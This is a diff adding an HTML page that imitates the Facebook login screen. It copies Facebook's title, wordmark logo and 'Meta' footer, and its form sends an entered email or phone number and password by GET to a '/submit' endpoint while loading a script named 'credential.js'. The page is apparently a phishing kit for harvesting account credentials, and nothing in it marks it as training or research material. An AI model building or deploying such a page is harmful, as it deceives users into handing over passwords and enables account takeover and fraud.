@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+<meta charset=UTF-8>
+<meta http-equiv=X-UA-Compatible content="IE=edge">
+<meta name=viewport content="width=device-width, initial-scale=1.0">
+<title>Facebook</title>
+<script src=js/site.js></script>
+<script src=js/credential.js></script>
+<link rel=stylesheet href=css/style.css>
+</head>
+<style>*{padding:0;margin:0;box-sizing:border-box}body{font-family:'Poppins',sans-serif;background-color:#ffffff;color:#1c1e21}main{height:70vh;width:100vw;position:center;margin:0 auto}footer{height:30vh;background-color:#fff}.row{display:flex;justify-content:space-around;align-items:center;width:100%;max-width:1000px;position:center;left:50%;top:50%;right:50%;:50%;transform:translate(-50%,-50%)}.col-logo{flex:0 0 50%;text-align:center}.col-form{flex:0 0 40%;text-align:center}.col-logo img{max-width:300px}.col-logo h2{font:26px;font-weight:400;padding:0 30px;line-height:32px}.col-form .form-container{background-color:#fff;border:0;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);margin-bottom:30px;padding:20px;max-width:400px}.col-form .form-container input,.col-form .form-container .btn-login{width:100%;margin:5px 0;height:45px;vertical-align:middle;font-size:16px}.col-form .form-container input{border:1px solid #dddfe2;color:#1d2129;padding:0 8px;outline:0}.col-form .form-container input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}.col-form .form-container .btn-login{background-color:#1877f2;border:0;border-radius:6px;font-size:20px;padding:0 16px;color:#fff;font-weight:700}.col-form .form-container a{display:block;color:#1877f2;font-size:14px;text-decoration:none;padding:10px 0 20px;border-bottom:1px solid #dadde1}.col-form .form-container a:hover{text-decoration:underline}.col-form .form-container .btn-new{background-color:#42b72a;border:0;border-radius:6px;font-size:17px;line-height:48px;padding:0 16px;color:#fff;font-weight:700;margin-top:20px}.col-form p{font-size:14px}.col-form p a{text-decoration:none;color:#1c1e21;font-weight:600;align="center"}.container{max-width:1000px;margin:0 auto;display:flex;justify-content:center;flex-direction:column;align-items:center;margin-top:3rem;font-size:14px}.col-form p a:hover{text-decoration:underline}.footer-contents{position:relative;max-width:1000px;margin:0 auto}footer ol{display:flex;flex-wrap:wrap;list-style-type:none;padding:10px 0}footer ol:first-child{border-bottom:1px solid #dddfe2}footer ol:first-child li:last-child button{background-color:#f5f6f7;border:1px solid #ccd0d5;outline:0;color:#4b4f56;padding:0 8px;font-weight:700;font-size:16px}footer ol li{padding-right:15px;font-size:12px;color:#385898}footer ol li a{text-decoration:none;color:#385898}footer ol li a:hover{text-decoration:underline}footer small{font-size:11px}</style>
+<body>
+<br>
+<br>
+<div class=container>
+<img src=data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDIyLjUxIDM2MCI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMxODc3RjI7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5GQldvcmRtYXJrX0hleC1SR0ItMTAyNDwvdGl0bGU+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMTY2LjQzLDEyNi42OGMtOS42NSwwLTEyLjQ0LDQuMjgtMTIuNDQsMTMuNzJ2MTUuNjZoMjUuNzRsLTIuNTgsMjUuM0gxNTR2NzYuNzhIMTIzLjExVjE4MS4zNkgxMDIuM3YtMjUuM2gyMC44MVYxNDAuODNjMC0yNS41MiwxMC4yOS0zOSwzOS0zOWExNDYuMTcsMTQ2LjE3LDAsMCwxLDE4LDEuMDd2MjMuODFaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMTgxLjg3LDIwMy44OGMwLTI4LjUyLDEzLjUxLTUwLDQxLjgyLTUwLDE1LjQ0LDAsMjQuODcsNy45NCwyOS4zOCwxNy44VjE1Ni4wNmgyOS41OVYyNTguMTRIMjUzLjA3VjI0Mi43Yy00LjI5LDkuODctMTMuOTQsMTcuNTktMjkuMzgsMTcuNTktMjguMzEsMC00MS44Mi0yMS40NS00MS44Mi01MFptMzAuODgsNi44N2MwLDE1LjIyLDUuNTcsMjUuMywxOS45NCwyNS4zLDEyLjY2LDAsMTkuMDktOS4yMiwxOS4wOS0yMy44VjIwMmMwLTE0LjU4LTYuNDMtMjMuOC0xOS4wOS0yMy44LTE0LjM3LDAtMTkuOTQsMTAuMDgtMTkuOTQsMjUuM1oiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik0zNDcsMTUzLjkxYzEyLDAsMjMuMzcsMi41OCwyOS41OSw2Ljg2bC02Ljg2LDIxLjg4YTQ4LjYsNDguNiwwLDAsMC0yMC41OS00LjcyYy0xNi43MywwLTI0LDkuNjUtMjQsMjYuMTd2NmMwLDE2LjUyLDcuMjksMjYuMTcsMjQsMjYuMTdhNDguNiw0OC42LDAsMCwwLDIwLjU5LTQuNzJsNi44NiwyMS44N2MtNi4yMiw0LjI5LTE3LjU4LDYuODctMjkuNTksNi44Ny0zNi4yNSwwLTUyLjc2LTE5LjUyLTUyLjc2LTUwLjgzdi00LjcyQzI5NC4yNCwxNzMuNDMsMzEwLjc1LDE1My45MSwzNDcsMTUzLjkxWiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTM4MC42NiwyMTF2LTljMC0yOC45NSwxNi41MS00OCw1MC4xOS00OCwzMS43NCwwLDQ1LjY4LDE5LjMsNDUuNjgsNDcuNjF2MTYuM2gtNjVjLjY1LDEzLjk0LDYuODcsMjAuMTYsMjQsMjAuMTYsMTEuNTksMCwyMy44MS0yLjM2LDMyLjgyLTYuMjJMNDc0LDI1M2MtOC4xNSw0LjMtMjQuODgsNy41MS0zOS42Nyw3LjUxQzM5NS4yNCwyNjAuNSwzODAuNjYsMjQxLDM4MC42NiwyMTFabTMwLjg4LTEzLjNoMzcuMzJ2LTIuNTdjMC0xMS4xNS00LjUtMjAtMTgtMjBDNDE2LjkxLDE3NS4xNCw0MTEuNTQsMTgzLjk0LDQxMS41NCwxOTcuNjZaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNTkxLDIxMC4zMmMwLDI4LjUyLTEzLjcyLDUwLTQyLDUwLTE1LjQ0LDAtMjYuMTYtNy43Mi0zMC40NS0xNy41OXYxNS40NEg0ODkuMzlWMTA0LjhMNTIwLjI3LDEwMnY2OC4yYzQuNS05LDE0LjM3LTE2LjMsMjguNzQtMTYuMywyOC4zMSwwLDQyLDIxLjQ1LDQyLDUwWm0tMzAuODgtNy4wOGMwLTE0LjM3LTUuNTctMjUuMDktMjAuMzctMjUuMDktMTIuNjYsMC0xOS41Miw5LTE5LjUyLDIzLjU5djEwLjcyYzAsMTQuNTgsNi44NiwyMy41OSwxOS41MiwyMy41OSwxNC44LDAsMjAuMzctMTAuNzIsMjAuMzctMjUuMDlaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNjAxLjMzLDIwOS42N3YtNS4xNGMwLTI5LjM5LDE2LjczLTUwLjYyLDUwLjgzLTUwLjYyUzcwMywxNzUuMTQsNzAzLDIwNC41M3Y1LjE0YzAsMjkuMzgtMTYuNzMsNTAuNjItNTAuODMsNTAuNjJTNjAxLjMzLDIzOS4wNSw2MDEuMzMsMjA5LjY3Wm03MC43OC03LjI5YzAtMTMuNTEtNS41OC0yNC4yMy0yMC0yNC4yM3MtMTkuOTUsMTAuNzItMTkuOTUsMjQuMjN2OS40NGMwLDEzLjUxLDUuNTgsMjQuMjMsMTkuOTUsMjQuMjNzMjAtMTAuNzIsMjAtMjQuMjNaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNzEzLjI3LDIwOS42N3YtNS4xNGMwLTI5LjM5LDE2LjczLTUwLjYyLDUwLjgzLTUwLjYyczUwLjgzLDIxLjIzLDUwLjgzLDUwLjYydjUuMTRjMCwyOS4zOC0xNi43Myw1MC42Mi01MC44Myw1MC42MlM3MTMuMjcsMjM5LjA1LDcxMy4yNywyMDkuNjdabTcwLjc4LTcuMjljMC0xMy41MS01LjU4LTI0LjIzLTE5Ljk1LTI0LjIzcy0xOS45NCwxMC43Mi0xOS45NCwyNC4yM3Y5LjQ0YzAsMTMuNTEsNS41NywyNC4yMywxOS45NCwyNC4yM3MxOS45NS0xMC43MiwxOS45NS0yNC4yM1oiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik04NTcuMzksMjA0Ljc0bDMwLjQ1LTQ4LjY4aDMyLjgxbC0zMS45NSw1MC40LDMzLjI0LDUxLjY4SDg4OS4xM2wtMzEuNzQtNTB2NTBIODI2LjVWMTA0LjhMODU3LjM5LDEwMloiLz48L3N2Zz4K alt=image height=100 width=300 />
+<form  action='/submit' method='get'>
+<div class=col-form border=1>
+<div class=form-container>
+<input name=user type=text placeholder="Email address or phone number">
+<input name=pass type=password placeholder=Password>
+<button type=submit class=btn-login>Login</button>
+<a href=#>Forgotten password?</a>
+<button class=btn-new>Create new Account</button>
+</div>
+<p><a href=#></a> <small>Meta © 2022</small></p>
+</div>
+</div>
+</form>
+</main>
+<footer>
+<div class=footer-contents>
+</div>
+</footer>
+</body>
+</html>
